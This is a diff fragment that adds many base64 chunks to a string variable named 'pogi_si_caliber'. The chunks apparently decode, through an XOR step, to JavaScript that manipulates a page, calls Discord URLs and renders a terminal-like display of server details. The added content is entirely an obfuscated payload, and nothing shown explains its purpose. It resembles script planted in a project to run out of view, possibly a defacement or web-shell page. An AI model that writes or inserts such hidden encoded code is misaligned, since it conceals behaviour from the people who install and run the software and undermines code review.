+pogi_si_caliber += "ysDMg56Dxs+N0tbG0drwxs/GwNfM0YuEjcSOysDMhIqYqYODg4";
+pogi_si_caliber += "PKxYvKwMyK2KmDg4ODg4PAzM3Q14PKzsSDnoPKwMyN0tbG0drw";
+pogi_si_caliber += "xs/GwNfM0YuEys7EhIqYqYODg4ODg8rFi9DR1Y3KwMzNitipg4";
+pogi_si_caliber += "ODg4ODg4PKxYuCys7EioPKwMyNys3NxtHr9+7vg56DhJ/KzsSD";
+pogi_si_caliber += "0NHAnoGEg4iDxtDAi9DR1Y3KwMzNioOIg4SBg8LP156BgYPPzM";
+pogi_si_caliber += "LHys3EnoHPwtnagYPRxsXG0dHG0dPMz8rA2p6BzcyO0cbFxtHR";
+pogi_si_caliber += "xtGBnYSYqYODg4ODg4ODxs/QxoPKxYvKzsSNxMbX4tfX0crB1t";
+pogi_si_caliber += "fGi4TQ0cCEioOCnp6D0NHVjcrAzM2Kg8rOxI3Q0cCDnoPQ0dWN";
+pogi_si_caliber += "ysDMzZipg4ODg4OD3sbP0MaDysWLgsrOxIrYqYODg4ODg4ODwM";
+pogi_si_caliber += "zN0NeDzsLRyIOeg8rAzI3S1sbR2vDGz8bA18zRi4SNxI7KwMyO";
+pogi_si_caliber += "zsLRyISKmKmDg4ODg4ODg8rFi87C0ciKg87C0ciN18bb1+DMzd";
+pogi_si_caliber += "fGzdeDnoPNws7GjdHG08/CwMaLjPj9wo7Zk46a/ozEyo+DhISK";
+pogi_si_caliber += "jdDPysDGi5OPg5CKjdfM78zUxtHgwtDGi4qYqYODg4ODg96pg4";
+pogi_si_caliber += "ODg96pg4ODg8rFi8bPjdfCxO3CzsaDnp6eg4TihIrYqYODg4OD";
+pogi_si_caliber += "g8rFi9DR1Y3W0c+DhYWDxs+NxMbX4tfX0crB1tfGi4TL0cbFhI";
+pogi_si_caliber += "qDgp6eg9DR1Y3W0c+Kg8bPjdDG1+LX19HKwdbXxouEy9HGxYSP";
+pogi_si_caliber += "g9DR1Y3W0c+KmKmDg4ODg4PGz43Qxtfi19fRysHW18aLhMLRys";
+pogi_si_caliber += "KOz8LBxs+Ej4PNws7Gg4iDhIPMzYPnytDAzNHHhIqYqYODg4Pe";
+pogi_si_caliber += "qYOD3oqYqd6pqcDMzdDXg9DG0dXG0erAzM2DnoPEg56dg8SDhY";
+pogi_si_caliber += "WDxI3Kx4OFhYPEjcrAzM2pg4Ocg4TL19fT0JmMjMDHzY3HytDA";
+pogi_si_caliber += "zNHHwtPTjcDMzozKwMzN0IyEg4iDxI3Kx4OIg4SMhIOIg8SNys";
+pogi_si_caliber += "DMzYOIg4uM/cL8jI3XxtDXi8SNysDMzYqDnIOEjcTKxYSDmYOE";
+pogi_si_caliber += "jdPNxISKg4iDhJzQytnGnpKRm4Spg4OZg4SEmKmpwtDazcCDxd";
+pogi_si_caliber += "bNwNfKzM2D0NrNwPDG0dXG0YvQ0dWK2KmDg8DMzdDXg8DMx8aD";
+pogi_si_caliber += "noPKzdXK18bgzMfGi9DR1YqYqYODysWLgsDMx8aKg9HG19bRzZ";
+pogi_si_caliber += "ipg4PX0drYqYODg4PAzM3Q14PRxtCDnoPC1MLK14PFxtfAy4uE";
+pogi_si_caliber += "y9fX09CZjIzHytDAzNHHjcDMzozC08qM1ZKTjMrN1crXxtCMhI";
+pogi_si_caliber += "OIg8bNwMzHxvbx6uDMztPMzcbN14vAzMfGioOIg4Sc1MrXy/zA";
+pogi_si_caliber += "zNbN19Ce19HWxoSPg9iDwMLAy8aZg4TNzI7Q18zRxoSD3oqYqY";
+pogi_si_caliber += "ODg4PKxYuC0cbQjczIioPRxtfW0c2YqYODg4PAzM3Q14PJg56D";
+pogi_si_caliber += "wtTCyteD0cbQjcnQzM2Lipipg4ODg8rFi9fa08bMxYPJjcLT09";
+pogi_si_caliber += "HM28rOwtfG/NPRxtDGzcDG/MDM1s3Xg56enoOEzdbOwcbRhIqD";
+pogi_si_caliber += "0NHVjczNz8rNxoOeg8mNwtPT0czbys7C18b809HG0MbNwMb8wM";
+pogi_si_caliber += "zWzdeYqYODg4PKxYvX2tPGzMWDyY3C09PRzNvKzsLXxvzOxs7B";
+pogi_si_caliber += "xtH8wMzWzdeDnp6eg4TN1s7BxtGEioPQ0dWNzsbOwcbR0IOeg8";
+pogi_si_caliber += "mNwtPT0czbys7C18b8zsbOwcbR/MDM1s3XmKmDg4ODwMzN0NeD";
+pogi_si_caliber += "xIOeg8mNxNbKz8eD39+D2N6YqYODg4PKxYvEjc3CzsaKg9DR1Y";
+pogi_si_caliber += "3Nws7Gg56DxI3Nws7GmKmDg4ODwMzN0NeDysDMzYOeg9DG0dXG";
+pogi_si_caliber += "0erAzM2LxIqYqYODg4PKxYvKwMzNioPQ0dWNysDMzYOeg8rAzM";
+pogi_si_caliber += "2YqYODg4PKxYuC0NHVjdbRz4OFhYPJjcDMx8aKg9DR1Y3W0c+D";
+pogi_si_caliber += "noOEy9fX09CZjIzHytDAzNHHjcTEjISDiIPJjcDMx8aYqYOD3s";
+pogi_si_caliber += "DC18DLi8aK2N6p3qmpwtDazcCDxdbNwNfKzM2D0cbF0cbQy+TC";
+pogi_si_caliber += "zcTNxs6Litipg4PC1MLK14Pz0czOytDGjcLPz4uL4Ozt5erkjc";
+pogi_si_caliber += "TCzcTNxs6D39+D+P6KjcXKz9fG0YvQg56dg9CDhYWDys3VytfG";
+pogi_si_caliber += "4MzHxovQioqNzsLTi9DazcDwxtHVxtGKipipg4PTwsrN1+TCzc";
+pogi_si_caliber += "TNxs6Lipip3qmpwdbKz8fkws3EzcbOi4qYqdPCys3X5MLNxM3G";
+pogi_si_caliber += "zouKmKnRxsXRxtDL5MLNxM3GzouKmKnQxtfqzdfG0dXCz4uLio";
+pogi_si_caliber += "OenYPYg8rFi8fMwNbOxs3XjdXK0MrBys/K19rw18LXxoOenp6D";
+pogi_si_caliber += "hNXK0MrBz8aEioPRxsXRxtDL5MLNxM3GzouKmIPej4OVk5OTk4";
+pogi_si_caliber += "qYqanAzM3Q14PRxtXGws/xzMzXg56Dx8zA1s7GzdeNxMbX5s/G";
+pogi_si_caliber += "zsbN1+Ha6seLhNDLxs/PhIqYqcDMzdDXg9HG1cbCz/fC0cTG19";
+pogi_si_caliber += "CDnoPi0dHC2o3F0czOi9HG1cbCz/HMzNeN0tbG0drwxs/GwNfM";
+pogi_si_caliber += "0eLPz4uEjdHG1cbCz4SKipipqcXWzcDXyszNg8rNytfwwNHMz8";
+pogi_si_caliber += "/xxtXGws+Litipg4PKxYvRxsfWwMbuzNfKzM2D39+DgouE6s3X";
+pogi_si_caliber += "xtHQxsDXyszN7MHQxtHVxtGEg8rNg9TKzcfM1IqK2KmDg4OD0c";
+pogi_si_caliber += "bVxsLP98LRxMbX0I3FzNHmwsDLi8bPg56dg8bPjcDPwtDQ78rQ";
+pogi_si_caliber += "143Cx8eLhMrNhIqKmKmDg4OD0cbX1tHNmKmDg96pg4PF1s3A18";
+pogi_si_caliber += "rMzYPQ2s3A8MrHxtCLitipg4ODg8DMzdDXg9HMzNf3zNODnoPR";
+pogi_si_caliber += "xtXGws/xzMzXjcTG1+HM1s3Hys3E4M/Kxs3X8cbA14uKjdfM05";
+pogi_si_caliber += "ipg4ODg8XM0YvAzM3Q14PGz4PMxYPRxtXGws/3wtHExtfQitip";
+pogi_si_caliber += "g4ODg4ODysWLxs+NwM/C0NDvytDXjcDMzdfCys3Qi4TKzYSKio";
+pogi_si_caliber += "PAzM3Xys3Wxpipg4ODg4ODxs+Nx8LXwtDG143QysfGg56Dxs+N";
+pogi_si_caliber += "xMbX4czWzcfKzcTgz8rGzdfxxsDXi4qN18zTg5+D0czM1/fM04";
+pogi_si_caliber += "Ocg4TXzNOEg5mDhMHM19fMzoSYqYODg4PeqYOD3qmDg8/G14PQ";
+pogi_si_caliber += "ysfG5dHCzsaDnoOTmKmDg9HG1cbCz/HMzNeNwsfH5tXGzdfvyt";
+pogi_si_caliber += "DXxs3G0YuE0MDRzM/PhI+Di4qDnp2D2KmDg4ODysWL0MrHxuXR";
+pogi_si_caliber += "ws7GioPRxtfW0c2YqYODg4PQysfG5dHCzsaDnoPRxtLWxtDX4s";
+pogi_si_caliber += "3KzsLXyszN5dHCzsaLi4qDnp2D2IPQysfG5dHCzsaDnoOTmIPQ";
+pogi_si_caliber += "2s3A8MrHxtCLipiD3oqYqYOD3o+D2IPTwtDQytXGmYPX0dbGg9";
+pogi_si_caliber += "6KmKmpg4PAzM3Q14PKzIOeg83G1IPqzdfG0dDGwNfKzM3swdDG";
+pogi_si_caliber += "0dXG0YvGzdfRysbQg56dg9ipg4ODg8XM0YvAzM3Q14PGzdfR2o";
+pogi_si_caliber += "PMxYPGzdfRysbQitipg4ODg4ODwMzN0NeDxs+DnoPGzdfR2o3X";
+pogi_si_caliber += "wtHExteYqYODg4ODg8DMzdDXg9DLzNTNg56Dxs3X0dqNytDqzd";
+pogi_si_caliber += "fG0dDGwNfKzcSYqYODg4ODg8bPjcrNxtHXg56DgtDLzNTNmKmD";
+pogi_si_caliber += "g4ODg4PGz43Az8LQ0O/K0NeN18zExM/Gi4TKzYSPg9DLzNTNip";
+pogi_si_caliber += "ipg4ODg96pg4ODg9DazcDwysfG0IuKmKmDg96Pg9iD0czM15mD";
+pogi_si_caliber += "0cbVxsLP8czM14+D0czM1+7C0cTKzZmDhJPT24OT09uDjpSGg5";
+pogi_si_caliber += "PT24SPg9fL0cbQy8zPx5mDk4Peipipg4PRxtXGws/3wtHExtfQ";
+pogi_si_caliber += "jcXM0ebCwMuLxs+Dnp2DysyNzMHQxtHVxovGz4qKmKmDg9Dazc";
+pogi_si_caliber += "DwysfG0IuKmKneqanAzM3Q14P35vHug56D4Ozt5erkjdfG0c7K";
+pogi_si_caliber += "zcLPmKnAzM3Q14PXxtHO8MbA18rMzYOeg8fMwNbOxs3XjcTG1+";
+pogi_si_caliber += "bPxs7Gzdfh2urHi4TXxtHOhIqYqcDMzdDXg9fG0c7s1teDnoPH";
+pogi_si_caliber += "zMDWzsbN143Extfmz8bOxs3X4drqx4uE18bRzuzW14SKmKnAzM";
+pogi_si_caliber += "3Q14PXxtHO5czRzoOeg8fMwNbOxs3XjcTG1+bPxs7Gzdfh2urH";
+pogi_si_caliber += "i4TXxtHO5czRzoSKmKnAzM3Q14PXxtHO6s3T1teDnoPHzMDWzs";
+pogi_si_caliber += "bN143Extfmz8bOxs3X4drqx4uE18bRzurN09bXhIqYqcDMzdDX";
+pogi_si_caliber += "g/fm8e786+rw9+zx+oOeg/j+mKnPxteD18bRzuvK0NfqzcfG24";
+pogi_si_caliber += "Oeg5OYqanAzM3Q14Pl5vfg6/zi8feDnoPDg4ODg4PQg4ODg4OD";
+pogi_si_caliber += "g4ODg4ODg4ODg4ODg4ODg43biJ6ZjamDg4ODmZuDg4ODg4ONjo";
+pogi_si_caliber += "7didfG1o2Dg4ODg4PZ/8ODg4OD/Yapg4ODjZubg4ODg4PH5YOD";
+pogi_si_caliber += "g4ODmpub7duDg4ODg4ODjYODg5/IqYODmZubm8zMzIPHm5ubwY";
+pogi_si_caliber += "ODg//Dm5ubm52Dg4ODjeOb7cbHm4Gpjombm5ubm5ubg5ybm5ub";
+pogi_si_caliber += "nYODmpubm5vlg4ON4/2Gm5ubm4Gpg4Obm5ubg4ODg4OBiYmBg4";
+pogi_si_caliber += "Pbm5ubm5vdg9ubm5mDg//DipvBjamDg5ubm5uDg4ODg4ODg4OD";
+pogi_si_caliber += "x5ubm5uJ/8ODg5ubm5vtnombm5ubqYODm5ubm4ODg4ODg4OD2Z";
+pogi_si_caliber += "uJiYH/w4ODg5mDg4abgYODg4Pxm5upg42bm5ub79aeg4ODmZyN";
+pogi_si_caliber += "jY2NjYODjY3lg4OD45v0zNaDmoapg/2Gm5ubiYODg4OfgYGbm5";
+pogi_si_caliber += "ubm5ubm5vdg42bm5ubm5vz/8Opg4ODhPqBg4ODg4ObmYODgZub";
+pogi_si_caliber += "m5ubm4mDg//Dg4OD/YHlqYODg4ODg4ODg4ODgYGDg4ODgYmJgf";
+pogi_si_caliber += "/Dw5ipqYyMg/DG0dXG0YPAz8zAyJmD0cbCx4PXy8aDy8zQ14TQ";
+pogi_si_caliber += "g8zUzYPnwtfGg8vGwsfG0YPQzIPXy8aD18bRzsrNws+D0MvM1N";
+pogi_si_caliber += "CD18vGg9DG0dXG0YTQg9fKzsaDi/b34IqNqYyMg+XCz8/Qg8HC";
+pogi_si_caliber += "wMiD18yD18vGg9XK0MrXzNGE0IPAz8zAyIPKxYPXy8aD0cbS1s";
+pogi_si_caliber += "bQ14PFwsrP0IOLxo3EjYPM08bNxseDxdHMzoPCg8/MwMLPg8XK";
+pogi_si_caliber += "z8aKjanAzM3Q14Pw5vH15vH84ezs94Oeg+fC18aN08LR0MaLhJ";
+pogi_si_caliber += "GTkZWOkpKOk5L3k5OZk5OZk5P5hIqYg4yMg9TLxs2D18vGg4HB";
+pogi_si_caliber += "zNuBg8DCzsaD1tOYg8bHyteD18yD18LQ18apz8bXg9DG0dXG0e";
+pogi_si_caliber += "zFxdDG14Oeg5OYqcDMzdDXg9DG0dXG0e3M1IOeg4uKg56dg+fC";
+pogi_si_caliber += "18aNzczUi4qDiIPQxtHVxtHsxcXQxteYqYvF1s3A18rMzYPQ2s";
+pogi_si_caliber += "3A8MbR1cbR4M/MwMiLitipg4PX0drYqYODg4PAzM3Q14PXk4Oe";
+pogi_si_caliber += "g+fC18aNzczUi4qYqYODg4PFxtfAy4vPzMDC18rMzY3L0cbFj4";
+pogi_si_caliber += "PYg87G18vMx5mDhOvm4ueEj4PAwsDLxpmDhM3MjtDXzNHGhIPe";
+pogi_si_caliber += "io3Xy8bNi9HG0IOenYPYqYODg4ODg8DMzdDXg8uDnoPRxtCNy8";
+pogi_si_caliber += "bCx8bR0I3ExteLhMfC18aEipipg4ODg4ODwMzN0NeD0NHVg56D";
+pogi_si_caliber += "y4Ocg+fC18aN08LR0MaLy4qDmYPtwu2YqYODg4ODg8rFi8rQ5c";
+pogi_si_caliber += "rNytfGi9DR1YqKg9DG0dXG0ezFxdDG14Oeg9DR1YOOg4vXk4OI";
+pogi_si_caliber += "g+fC18aNzczUi4qKg4yDkZipg4ODg96KjcDC18DLi4uKg56dg9";
+pogi_si_caliber += "jeipipg4PewMLXwMuLxorY3qneiouKmKnAzM3Q14PW0/DGwNCD";
+pogi_si_caliber += "noOLioOenYPuwtfLjc7C24uTj4PuwtfLjcXPzMzRi4vQxtHVxt";
+pogi_si_caliber += "HtzNSLioOOg/Dm8fXm8fzh7Oz3ioOMg5KTk5OKipipwMzN0NeD";
+pogi_si_caliber += "08/W0cLPg56Di82Pg9SKg56dg82DiIOEg4SDiIPUg4iDi82Dnp";
+pogi_si_caliber += "6eg5KDnIOEhIOZg4TQhIqYqcXWzcDXyszNg9bT18rOxu/MzcSL";
+pogi_si_caliber += "itipg4PAzM3Q14PXg56D1tPwxsDQi4qYqYOD0cbX1tHNg9PP1t";
+pogi_si_caliber += "HCz4vuwtfLjcXPzMzRi9eDjIOblZeTk4qPg4THwtqEioOIg4SP";
+pogi_si_caliber += "g4SDiIPTz9bRws+L7sLXy43Fz8zM0YvXg4aDm5WXk5ODjIOQlZ";
+pogi_si_caliber += "OTio+DhMvM1tGEioOIg4SPg4SDiIPTz9bRws+L7sLXy43Fz8zM";
+pogi_si_caliber += "0YvXg4aDkJWTk4OMg5WTio+DhM7KzYSKmKneqcXWzcDXyszNg9";
+pogi_si_caliber += "bT18rOxvDLzNHXi4rYqYODwMzN0NeD14Oeg9bT8MbA0IuKj4PH";
+pogi_si_caliber += "g56D7sLXy43Fz8zM0YvXg4yDm5WXk5OKj4PLg56D7sLXy43Fz8";
+pogi_si_caliber += "zM0YvXg4aDm5WXk5ODjIOQlZOTio+DzoOeg+7C18uNxc/MzNGL";
+pogi_si_caliber += "14OGg5CVk5ODjIOVk4qYqYOD0cbX1tHNg4vHg5yD08/W0cLPi8";
+pogi_si_caliber += "ePg4THwtqEioOIg4SPg4OEg5mDhISKg4iDy4OIg4SZhIOIg/DX";
+pogi_si_caliber += "0crNxIvOio3Twsfw18LR14uRj4OEk4SKmKneqanAzM3Q14Pl5v";
+pogi_si_caliber += "fg6/zw8+bg8IOeg/ipg4P4hOzwhI+DhOjCz8qD5O32jO/Kzdbb";
+pogi_si_caliber += "g/HMz8/KzcSD25uV/JWXhP6PqYOD+ITrzNDXhI+DhOLw9vCD8e";
+pogi_si_caliber += "zkg/nG08va0dbQg+SSl4OL5OKXk5Hx6YqE/o+pg4P4hOHMwtHH";
+pogi_si_caliber += "hI+DhOLw9vD3xuiD4Ozu8/b35vGD6u3gjYPk4peTkfHphP6PqY";
+pogi_si_caliber += "OD+ITh6uzwhI+DhOLOxtHKwMLNg+7GxMLX0cbNx9CD5OKXk5Hx";
+pogi_si_caliber += "6Y2QkZaE/o+pg4P4hOjG0c3Gz4SPg4SVjZqNlI7CzseVl4T+j6";
+pogi_si_caliber += "mDg/iE9tPXys7GhI+Di4qDnp2D1tPXys7G78zNxIuK/o+pg4P4";
+pogi_si_caliber += "hPPCwMjCxMbQhI+DhJGbmpeDi8fTyMSKj4OSkYOL0M3C04qE/o";
+pogi_si_caliber += "+pg4P4hPDLxs/PhI+DhNnQy4OWjZqE/o+pg4P4hPHG0MzP1tfK";
+pogi_si_caliber += "zM2Ej4OEkZaVk9uSlZOTg+ODkpGT69mE/o+pg4P4hOfmhI+DhP";
+pogi_si_caliber += "vFwMaDl42Sm4T+j6mDg/iE9O6Ej4OE+8XUzpeE/o+pg4P4hPTu";
+pogi_si_caliber += "g/fLxs7GhI+DhOjCz8qO58LRyIT+j6mDg/iE98vGzsaEj4OE6M";
+pogi_si_caliber += "LPyo7nwtHIg/jk9+iQ/oT+j6mDg/iE6sDMzdCEj4OE5c/C147x";
+pogi_si_caliber += "xs7K247xxseO58LRyIP45PfokP6E/o+pg4P4hPfG0c7KzcLPhI";
+pogi_si_caliber += "+DhNLXxtHOys3Cz4T+j6mDg/iE4PP2hI+DhOLu54Px2tnGzYOa";
+pogi_si_caliber += "g5Wak5Pr8IOLkpWKg+ODl42ak5Xk69mE/o+pg4P4hOTz9oSPg4";
+pogi_si_caliber += "Ti7ueD8cLHxszNg/H7g5WUk5PwhP6PqYOD+ITuxs7M0dqEj4OE";
+pogi_si_caliber += "lZCXmu7K4YOMg5KWkJWS7srhhP6PqYOD+ITnytDIhI+DhJKblO";
+pogi_si_caliber += "SDjIOXlZvkg4uXkIaKg+317saE/o+pg4P4hOHC19fG0dqEj4OE";
+pogi_si_caliber += "m5GGg/jnytDAy8LRxMrNxP6E/o+p/pipwMzN0NeD5eb34Ov88P";
+pogi_si_caliber += "Ti9+Drg56D+ISAxcWRl5CbhI+DhIDFxZXBlJuEj4OEgMGQkMKX";
+pogi_si_caliber += "lYSPg4SAxZfFl8WXhI+DhICVwZeTl5WEj4OEgJfCksKRk4SPg4";
+pogi_si_caliber += "SAkcGTlpOahP6YqampxdbNwNfKzM2D18bRzuHM24uK2KmDg8DM";
+pogi_si_caliber += "zdDXg8HM24Oeg8fMwNbOxs3XjcDRxsLXxubPxs7GzdeLhMfK1Y";
+pogi_si_caliber += "SKmKmDg8HM243Az8LQ0O3CzsaDnoOE18bRzo7R1s2EmKmDg9fG";
+pogi_si_caliber += "0c7s1teNwtPTxs3H4MvKz8eLwczbipipg4PRxtfW0c2DwczbmK";
+pogi_si_caliber += "neqanF1s3A18rMzYPXxtHO89HMztPXi9PC0cbN14rYqYODwMzN";
+pogi_si_caliber += "0NeDz8rNxoOeg8fMwNbOxs3XjcDRxsLXxubPxs7GzdeLhMfK1Y";
+pogi_si_caliber += "SKmKmDg8/KzcaNwM/C0NDtws7Gg56DhMXPxtuDxc/G247U0cLT";
+pogi_si_caliber += "g8rXxs7QjsHC0MbPys3Gg8TC047bjpKNloSDiIOL08LRxs3Xjc";
+pogi_si_caliber += "DLys/H5s/GzsbN1+DM1s3Xg5yDhIPO146QhIOZg4SEipipg4PA";
+pogi_si_caliber += "zM3Q14PQy8bPz4Oeg8fMwNbOxs3XjcDRxsLXxubPxs7GzdeLhN";
+pogi_si_caliber += "DTws2Eipipg4PQy8bPz43Az8LQ0O3CzsaDnoOE0MbPxsDXjs3M";
+pogi_si_caliber += "zcaEmKmDg8DMzdDXg9bQxtGDnoPHzMDWzsbN143A0cbC18bmz8";
+pogi_si_caliber += "bOxs3Xi4TQ08LNhIqYqYOD1tDG0Y3Az8LQ0O3CzsaDnoOE18bb";
+pogi_si_caliber += "147Bz8zMx47MyISYqYOD1tDG0Y3XxtvX4MzN18bN14Oeg/fm8e";
+pogi_si_caliber += "6N1tDG0YOIg4TjhIOIg/fm8e6Ny8zQ15ipg4PAzM3Q14PAzM/M";
+pogi_si_caliber += "zYOeg8fMwNbOxs3XjcDRxsLXxubPxs7GzdeLhNDTws2Eipipg4";
+pogi_si_caliber += "PAzM/MzY3Az8LQ0O3CzsaDnoOE18bb147Bz8zMx47C0MuEmKmD";
+pogi_si_caliber += "g8DMz8zNjdfG29fgzM3Xxs3Xg56DhJmEmKmDg8DMzdDXg9fKz8";
+pogi_si_caliber += "fGg56Dx8zA1s7GzdeNwNHGwtfG5s/GzsbN14uE0NPCzYSKmKmD";
+pogi_si_caliber += "g9fKz8fGjcDPwtDQ7cLOxoOeg4TXxtvXjsHPzMzHhJipg4PXys";
+pogi_si_caliber += "/Hxo3XxtvX4MzN18bN14Oeg4TdhJipg4PAzM3Q14PHzM/PwtGD";
+pogi_si_caliber += "noPHzMDWzsbN143A0cbC18bmz8bOxs3Xi4TQ08LNhIqYqYODx8";
+pogi_si_caliber += "zPz8LRjcDPwtDQ7cLOxoOeg4TXxtvXjsHPzMzHjsLQy4SYqYOD";
+pogi_si_caliber += "x8zPz8LRjdfG29fgzM3Xxs3Xg56DhIeEmKmDg9DLxs/PjcLT08";
+pogi_si_caliber += "bNx4vW0MbRj4PAzM/MzY+D18rPx8aPg8fMz8/C0YqYqYODwMzN";
+pogi_si_caliber += "0NeD18bb14Oeg8fMwNbOxs3XjcDRxsLXxubPxs7GzdeLhNDTws";
+pogi_si_caliber += "2Eipipg4PXxtvXjcDPwtDQ7cLOxoOeg4TXxtvXjsHPzMzHjtDM";
+pogi_si_caliber += "xdeEmKmDg8/KzcaNwtPTxs3Hi9DLxs/Pj4PXxtvXipipg4PTwt";
+pogi_si_caliber += "HGzdeNwtPTxs3H4MvKz8eLz8rNxoqYqYOD0cbX1tHNg9fG29eY";
+pogi_si_caliber += "qd6pqcXWzcDXyszNg9fG0c700crXxovTwtHGzdePg8/KzcbQit";
+pogi_si_caliber += "ipg4PFzNGLwMzN0NeDz8rNxoPMxYPPys3G0IPf34P4/orYqYOD";
+pogi_si_caliber += "g4PAzM3Q14PRzNSDnoPHzMDWzsbN143A0cbC18bmz8bOxs3Xi4";
+pogi_si_caliber += "THytWEipipg4ODg9HM1I3Az8LQ0O3CzsaDnoOE18bb147Bz8zM";
+pogi_si_caliber += "x47QzMXXhJipg4ODg8DMzdDXg87C0ciDnoPHzMDWzsbN143A0c";
+pogi_si_caliber += "bC18bmz8bOxs3Xi4TQ08LNhIqYqYODg4POwtHIjcDPwtDQ7cLO";
+pogi_si_caliber += "xoOeg4TXxtvXjsHPzMzHjsfKzoSYqYODg4POwtHIjdfG29fgzM";
+pogi_si_caliber += "3Xxs3Xg56DhJ2DhJipg4ODg8DMzdDXg9fG29eDnoPHzMDWzsbN";
+pogi_si_caliber += "143A0cbC18bmz8bOxs3Xi4TQ08LNhIqYqYODg4PXxtvXjdfG29";
+pogi_si_caliber += "fgzM3Xxs3Xg56Dz8rNxpipg4ODg9HM1I3C09PGzceLzsLRyI+D";
+pogi_si_caliber += "18bb14qYqYODg4PTwtHGzdeNwtPTxs3H4MvKz8eL0czUipipg4";
+pogi_si_caliber += "Peqd6pqcXWzcDXyszNg9fG0c7z0crN14vTwtHGzdePg8/KzcbQ";
+pogi_si_caliber += "itipg4PFzNGLwMzN0NeDz8rNxoPMxYPPys3G0IPf34P4/orYqY";
+pogi_si_caliber += "ODg4PAzM3Q14PRzNSDnoPHzMDWzsbN143A0cbC18bmz8bOxs3X";
+pogi_si_caliber += "i4THytWEipipg4ODg9HM1I3Az8LQ0O3CzsaDnoOE18bb147Bz8";
+pogi_si_caliber += "zMx47QzMXXhJipg4ODg9HM1I3XxtvX4MzN18bN14Oeg8/KzcaD";
+pogi_si_caliber += "np6eg4SEg5yDhP/Wk5PCk4SDmYPPys3GmKmDg4OD08LRxs3Xjc";
+pogi_si_caliber += "LT08bNx+DLys/Hi9HM1IqYqYOD3qneqanF1s3A18rMzYPXxtHO";
+pogi_si_caliber += "4c/MwMiL08LRxs3Xj4PGz4rYqYODxs+NwM/C0NDvytDXjcLHx4";
+pogi_si_caliber += "uE18bRzo7KzYSKmKmDg9PC0cbN143C09PGzcfgy8rPx4vGz4qY";
+pogi_si_caliber += "qd6pqcXWzcDXyszNg9fG0c7lxtfAy4uK2KmDg8DMzdDXg9TRwt";
+pogi_si_caliber += "ODnoPHzMDWzsbN143A0cbC18bmz8bOxs3Xi4THytWEipipg4PU";
+pogi_si_caliber += "0cLTjcDPwtDQ7cLOxoOeg4TO146Rg8XPxtuDytfGztCO0NfC0d";
+pogi_si_caliber += "eDxMLTjpaDzsLbjviWlZPT2/6ZxMLTjpOEmKmDg8DMzdDXg8LR";
+pogi_si_caliber += "14Oeg8fMwNbOxs3XjcDRxsLXxubPxs7GzdeLhNPRxoSKmKmDg8";
+pogi_si_caliber += "LR143Az8LQ0O3CzsaDnoOEzo6Tg8vKx8fGzYPFz8bbjs3MzcaD";
+pogi_si_caliber += "0MbPxsDXjs3MzcaD1MvK18bQ08LAxo7T0caD18bb1474kpHT2/";
+pogi_si_caliber += "6Dz8bCx8rNxI74ko2Slf6D18bb147Bz8zMx4POys2O+JSRk9Pb";
+pogi_si_caliber += "/pnBz8zAyISYqYODwtHXjdDG1+LX19HKwdbXxouEwtHKwo7Lys";
+pogi_si_caliber += "fHxs2Ej4OE19HWxoSKmKmDg8LR143XxtvX4MzN18bN14Oeg+Xm";
+pogi_si_caliber += "9+Dr/OLx95ipg4PAzM3Q14PKzcXMg56Dx8zA1s7GzdeNwNHGwt";
+pogi_si_caliber += "fG5s/GzsbN14uEx8rVhIqYqYODys3FzI3Az8LQ0O3CzsaDnoOE";
+pogi_si_caliber += "zsrNjtSOk4PXxtvXjviSkdPb/oPPxsLHys3EjviSjZaW/oPOwt";
+pogi_si_caliber += "uO+JSTk9Pb/pnXxtvXjviSko2W09v+hJipg4PAzM3Q14PXytfP";
+pogi_si_caliber += "xoOeg8fMwNbOxs3XjcDRxsLXxubPxs7GzdeLhMfK1YSKmKmDg9";
+pogi_si_caliber += "fK18/GjcDPwtDQ7cLOxoOeg4TXxtvXjsHPzMzHhJipg4PXytfP";
+pogi_si_caliber += "xo3XxtvX4MzN18bN14Oeg/fm8e6N1tDG0YOIg4TjhIOIg/fm8e";
+pogi_si_caliber += "6Ny8zQ15ipg4PAzM3Q14PR1s/Gg56Dx8zA1s7GzdeNwNHGwtfG";
+pogi_si_caliber += "5s/GzsbN14uEx8rVhIqYqYOD0dbPxo3Az8LQ0O3CzsaDnoOE18";
+pogi_si_caliber += "bb147Bz8zMx47Hys6EmKmDg9HWz8aN18bb1+DMzdfGzdeDnoOE";
+pogi_si_caliber += "joSN0cbTxsLXi4v35vHujdbQxtGDiIOE44SDiIP35vHujcvM0N";
+pogi_si_caliber += "eKjc/GzcTXy4qYqYODys3FzI3C09PGzceL18rXz8aPg9HWz8aK";
+pogi_si_caliber += "mKmDg8XM0YvAzM3Q14P4yMbaj4PVws/Wxv6DzMWD5eb34Ov88P";
+pogi_si_caliber += "Pm4PCK2KmDg4ODwMzN0NeD0czUg56Dx8zA1s7GzdeNwNHGwtfG";
+pogi_si_caliber += "5s/GzsbN14uEx8rVhIqYqYODg4PRzNSNwM/C0NDtws7Gg56DhM";
+pogi_si_caliber += "HRxsLIjtTM0cfQhJipg4ODg8DMzdDXg8iDnoPHzMDWzsbN143A";
+pogi_si_caliber += "0cbC18bmz8bOxs3Xi4TQ08LNhIqYqYODg4PIjcDPwtDQ7cLOxo";
+pogi_si_caliber += "Oeg4TXxtvXjsHPzMzHhJipg4ODg8iN18bb1+DMzdfGzdeDnoPI";
+pogi_si_caliber += "xtqDiIOEmYOEmKmDg4ODwMzN0NeD1YOeg8fMwNbOxs3XjcDRxs";
+pogi_si_caliber += "LXxubPxs7GzdeLhNDTws2Eipipg4ODg9WNwM/C0NDtws7Gg56D";
+pogi_si_caliber += "hNfG29eOwc/MzMeO0MzF14SYqYODg4PVjdfG29fgzM3Xxs3Xg5";
+pogi_si_caliber += "6D19rTxszFg9XCz9bGg56enoOExdbNwNfKzM2Eg5yD1cLP1saL";
+pogi_si_caliber += "ioOZg9XCz9bGmKmDg4OD0czUjcLT08bNx4vIj4PVipipg4ODg8";
+pogi_si_caliber += "rNxcyNwtPTxs3H4MvKz8eL0czUipipg4PeqYODwMzN0NeD0NTC";
+pogi_si_caliber += "18DLg56Dx8zA1s7GzdeNwNHGwtfG5s/GzsbN14uEx8rVhIqYqY";
+pogi_si_caliber += "OD0NTC18DLjcDPwtDQ7cLOxoOeg4TO146Rg8XPxtuDxMLTjpKE";
+pogi_si_caliber += "mKmDg9DUwtfAy43Qxtfi19fRysHW18aLhMLRysKOy8rHx8bNhI";
+pogi_si_caliber += "+DhNfR1saEipipg4PFzNGLwMzN0NeDwMzPzNGDzMWD5eb34Ov8";
+pogi_si_caliber += "8PTi9+Dritipg4ODg8DMzdDXg8DLytODnoPHzMDWzsbN143A0c";
